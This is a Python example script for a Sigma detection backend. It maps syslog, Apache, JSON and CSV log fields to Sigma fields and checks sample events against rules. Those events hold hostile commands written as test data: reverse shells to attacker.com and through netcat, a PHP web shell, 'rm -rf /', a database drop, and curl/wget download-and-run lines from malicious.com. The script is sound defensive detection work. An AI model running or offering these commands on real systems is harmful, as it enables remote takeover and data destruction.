#!/usr/bin/env python3
"""
Custom Log Format Example for Sigma Simple Backend

This example demonstrates how to integrate the Sigma Simple Backend with
custom log formats using field mappings and data transformation.
"""

import sys
import os
import json
import csv
import re
from datetime import datetime
from typing import Dict, List, Any

# Add parent directory to path to import the backend
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sigma_simple_backend import (
    SimpleEvalBackend,
    RestrictivenessLevel,
    MockRuleCollection,
    Alert
)


class CustomLogProcessor:
    """Process custom log formats for Sigma rule evaluation"""
    
    def __init__(self, field_mappings: Dict[str, str], restrictiveness=RestrictivenessLevel.BALANCED):
        """
        Initialize with custom field mappings
        
        Args:
            field_mappings: Dictionary mapping Sigma fields to your log fields
            restrictiveness: Rule matching restrictiveness level
        """
        self.backend = SimpleEvalBackend(
            restrictiveness=restrictiveness,
            field_mappings=field_mappings
        )
        self.field_mappings = field_mappings
        self.rule_collection = MockRuleCollection()
        self.compiled_rules = []
    
    def compile_rules(self):
        """Compile Sigma rules for evaluation"""
        self.compiled_rules = self.backend.compile(self.rule_collection)
        print(f"Compiled {len(self.compiled_rules)} rules with custom field mappings")
    
    def process_event(self, event: Dict[str, Any]) -> List[Alert]:
        """
        Process a single event against compiled rules
        
        Args:
            event: Log event in your custom format
            
        Returns:
            List of alerts generated
        """
        alerts = []
        
        for rule_func in self.compiled_rules:
            alert = self.backend.test_rule_against_event(rule_func, event)
            if alert:
                alerts.append(alert)
        
        return alerts


def syslog_format_example():
    """Example working with syslog format logs"""
    
    print("=== Syslog Format Example ===\n")
    
    # Define field mappings for syslog format
    syslog_mappings = {
        "process.name": "program",
        "process.pid": "pid", 
        "log.message": "message",
        "host.name": "hostname",
        "syslog.facility": "facility",
        "syslog.severity": "severity",
        "@timestamp": "timestamp",
    }
    
    processor = CustomLogProcessor(syslog_mappings, RestrictivenessLevel.BALANCED)
    processor.compile_rules()
    
    # Sample syslog events
    syslog_events = [
        {
            "timestamp": "2025-01-09T17:04:17.123Z",
            "hostname": "webserver-01",
            "facility": "daemon",
            "severity": "info",
            "program": "bash",
            "pid": "12345",
            "message": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
        },
        {
            "timestamp": "2025-01-09T17:05:30.456Z", 
            "hostname": "dbserver-02",
            "facility": "auth",
            "severity": "warning",
            "program": "sudo",
            "pid": "67890",
            "message": "sudo -u postgres psql -c 'DROP DATABASE production;'"
        }
    ]
    
    print("Processing syslog events...")
    for i, event in enumerate(syslog_events, 1):
        print(f"\nEvent {i}: {event['program']} on {event['hostname']}")
        print(f"Message: {event['message'][:60]}...")
        
        alerts = processor.process_event(event)
        
        if alerts:
            print(f"🚨 {len(alerts)} alert(s) generated:")
            for alert in alerts:
                print(f"  - {alert.rule_title} (Severity: {alert.severity})")
        else:
            print("✅ No alerts generated")


def apache_access_log_example():
    """Example working with Apache access log format"""
    
    print("\n=== Apache Access Log Example ===\n")
    
    # Define field mappings for Apache access logs
    apache_mappings = {
        "source.ip": "client_ip",
        "http.request.method": "method",
        "url.path": "path",
        "http.response.status_code": "status",
        "user_agent.original": "user_agent",
        "log.message": "raw_log",
        "@timestamp": "timestamp"
    }
    
    processor = CustomLogProcessor(apache_mappings, RestrictivenessLevel.PERMISSIVE)
    processor.compile_rules()
    
    # Sample Apache access log events
    apache_events = [
        {
            "timestamp": "2025-01-09T17:04:17.123Z",
            "client_ip": "192.168.1.100",
            "method": "POST",
            "path": "/admin/config.php",
            "status": "200",
            "user_agent": "sqlmap/1.4.7",
            "raw_log": '192.168.1.100 - - [09/Jan/2025:17:04:17] "POST /admin/config.php" 200 1234 "sqlmap/1.4.7"'
        },
        {
            "timestamp": "2025-01-09T17:05:30.456Z",
            "client_ip": "10.0.0.5", 
            "method": "GET",
            "path": "/wp-admin/admin-ajax.php",
            "status": "200",
            "user_agent": "<?php system($_GET['cmd']); ?>",
            "raw_log": '10.0.0.5 - - [09/Jan/2025:17:05:30] "GET /wp-admin/admin-ajax.php" 200 567 "<?php system($_GET[\'cmd\']); ?>"'
        }
    ]
    
    print("Processing Apache access log events...")
    for i, event in enumerate(apache_events, 1):
        print(f"\nEvent {i}: {event['method']} {event['path']} from {event['client_ip']}")
        print(f"User-Agent: {event['user_agent'][:50]}...")
        
        alerts = processor.process_event(event)
        
        if alerts:
            print(f"🚨 {len(alerts)} alert(s) generated:")
            for alert in alerts:
                print(f"  - {alert.rule_title} (Severity: {alert.severity})")
        else:
            print("✅ No alerts generated")


def json_log_format_example():
    """Example working with structured JSON logs"""
    
    print("\n=== JSON Log Format Example ===\n")
    
    # Define field mappings for structured JSON logs
    json_mappings = {
        "process.name": "process.executable",
        "process.pid": "process.pid",
        "process.command_line": "process.args",
        "user.name": "user.name",
        "host.name": "agent.hostname",
        "log.message": "message",
        "@timestamp": "@timestamp"
    }
    
    processor = CustomLogProcessor(json_mappings, RestrictivenessLevel.RESTRICTIVE)
    processor.compile_rules()
    
    # Sample structured JSON events
    json_events = [
        {
            "@timestamp": "2025-01-09T17:04:17.123Z",
            "agent": {
                "hostname": "workstation-01",
                "version": "1.0.0"
            },
            "process": {
                "executable": "python3",
                "pid": 15432,
                "args": "python3 -c 'import os; os.system(\"rm -rf /\")'",
                "parent": {
                    "pid": 1234,
                    "executable": "bash"
                }
            },
            "user": {
                "name": "john",
                "id": 1001
            },
            "message": "Executing Python command with system call"
        },
        {
            "@timestamp": "2025-01-09T17:06:45.789Z", 
            "agent": {
                "hostname": "server-02",
                "version": "1.0.0"
            },
            "process": {
                "executable": "nc",
                "pid": 98765,
                "args": "nc -l -p 4444 -e /bin/bash",
                "parent": {
                    "pid": 5678,
                    "executable": "ssh"
                }
            },
            "user": {
                "name": "admin",
                "id": 0
            },
            "message": "Network connection established"
        }
    ]
    
    print("Processing structured JSON events...")
    for i, event in enumerate(json_events, 1):
        # Flatten nested JSON for easier processing
        flattened_event = flatten_json(event)
        
        print(f"\nEvent {i}: {flattened_event.get('process.executable')} on {flattened_event.get('agent.hostname')}")
        print(f"Command: {flattened_event.get('process.args', '')[:60]}...")
        
        alerts = processor.process_event(flattened_event)
        
        if alerts:
            print(f"🚨 {len(alerts)} alert(s) generated:")
            for alert in alerts:
                print(f"  - {alert.rule_title} (Severity: {alert.severity})")
                if alert.mitre_techniques:
                    print(f"    MITRE Techniques: {', '.join(alert.mitre_techniques)}")
        else:
            print("✅ No alerts generated")


def csv_log_format_example():
    """Example working with CSV log format"""
    
    print("\n=== CSV Log Format Example ===\n")
    
    # Define field mappings for CSV logs
    csv_mappings = {
        "process.name": "ProcessName",
        "process.command_line": "CommandLine", 
        "user.name": "UserName",
        "host.name": "ComputerName",
        "log.message": "EventData",
        "@timestamp": "TimeGenerated"
    }
    
    processor = CustomLogProcessor(csv_mappings, RestrictivenessLevel.BALANCED)
    processor.compile_rules()
    
    # Sample CSV data (as if read from CSV file)
    csv_data = """TimeGenerated,ComputerName,ProcessName,UserName,CommandLine,EventData
2025-01-09T17:04:17.123Z,HOST-01,powershell.exe,user1,"powershell.exe -enc JABjAGwAaQBlAG4AdAA=","Encoded PowerShell command execution"
2025-01-09T17:05:30.456Z,HOST-02,cmd.exe,admin,"cmd.exe /c whoami /priv","Privilege enumeration command"
2025-01-09T17:06:45.789Z,HOST-03,bash,root,"bash -c 'curl http://malicious.com/shell.sh | bash'","Suspicious download and execution"
"""
    
    print("Processing CSV log events...")
    
    # Parse CSV data
    csv_reader = csv.DictReader(csv_data.strip().split('\n'))
    
    for i, row in enumerate(csv_reader, 1):
        print(f"\nEvent {i}: {row['ProcessName']} on {row['ComputerName']}")
        print(f"Command: {row['CommandLine'][:60]}...")
        
        alerts = processor.process_event(row)
        
        if alerts:
            print(f"🚨 {len(alerts)} alert(s) generated:")
            for alert in alerts:
                print(f"  - {alert.rule_title} (Severity: {alert.severity})")
        else:
            print("✅ No alerts generated")


def flatten_json(nested_json: Dict, separator: str = '.') -> Dict:
    """
    Flatten nested JSON for easier field mapping
    
    Args:
        nested_json: Nested dictionary to flatten
        separator: Character to use for separating nested keys
        
    Returns:
        Flattened dictionary
    """
    def _flatten(obj, parent_key=''):
        items = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                new_key = f"{parent_key}{separator}{k}" if parent_key else k
                items.extend(_flatten(v, new_key).items())
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                new_key = f"{parent_key}{separator}{i}" if parent_key else str(i)
                items.extend(_flatten(v, new_key).items())
        else:
            return {parent_key: obj}
        return dict(items)
    
    return _flatten(nested_json)


def real_time_file_monitoring_example():
    """Example of real-time log file monitoring"""
    
    print("\n=== Real-time File Monitoring Example ===\n")
    
    # This would typically read from a real log file
    # For demo purposes, we'll simulate log entries
    
    custom_mappings = {
        "process.name": "proc",
        "log.message": "msg",
        "user.name": "user",
        "@timestamp": "ts"
    }
    
    processor = CustomLogProcessor(custom_mappings)
    processor.compile_rules()
    
    # Simulate streaming log entries
    simulated_logs = [
        '{"ts": "2025-01-09T17:04:17.123Z", "proc": "wget", "user": "user1", "msg": "wget http://malicious.com/backdoor.sh"}',
        '{"ts": "2025-01-09T17:05:30.456Z", "proc": "chmod", "user": "user2", "msg": "chmod +x /tmp/backdoor.sh"}', 
        '{"ts": "2025-01-09T17:06:45.789Z", "proc": "bash", "user": "user3", "msg": "/tmp/backdoor.sh"}',
    ]
    
    print("Simulating real-time log processing...")
    print("In a real implementation, you would tail a log file or receive logs via syslog/API")
    
    for i, log_line in enumerate(simulated_logs, 1):
        try:
            event = json.loads(log_line)
            print(f"\nProcessing log entry {i}: {event['proc']} by {event['user']}")
            
            alerts = processor.process_event(event)
            
            if alerts:
                print(f"🚨 {len(alerts)} alert(s) generated:")
                for alert in alerts:
                    print(f"  - {alert.rule_title}")
                    # In real implementation, you would:
                    # - Send to SIEM
                    # - Log alerts to file
                    # - Send notifications
                    # - Take automated actions
            else:
                print("✅ No threats detected")
                
        except json.JSONDecodeError:
            print(f"Error: Invalid JSON in log line {i}")


if __name__ == "__main__":
    try:
        syslog_format_example()
        apache_access_log_example() 
        json_log_format_example()
        csv_log_format_example()
        real_time_file_monitoring_example()
        
        print("\n" + "="*60)
        print("Custom Log Format Examples Completed!")
        print("="*60)
        
        print("\nKey Takeaways:")
        print("1. Define field mappings to translate your log format to Sigma fields")
        print("2. Use appropriate restrictiveness levels for your environment")
        print("3. Flatten nested JSON structures for easier processing")
        print("4. Handle different log formats (syslog, JSON, CSV, etc.)")
        print("5. Implement real-time processing for streaming logs")
        print("\nNext Steps:")
        print("- Adapt the field mappings to your specific log format")
        print("- Add custom alert handling for your environment")
        print("- Integrate with your existing logging infrastructure")
        
    except Exception as e:
        print(f"Error running examples: {e}")
        import traceback
        traceback.print_exc() 